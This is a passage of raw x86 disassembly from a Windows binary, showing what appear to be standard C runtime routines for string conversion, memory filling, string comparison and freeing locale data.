  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
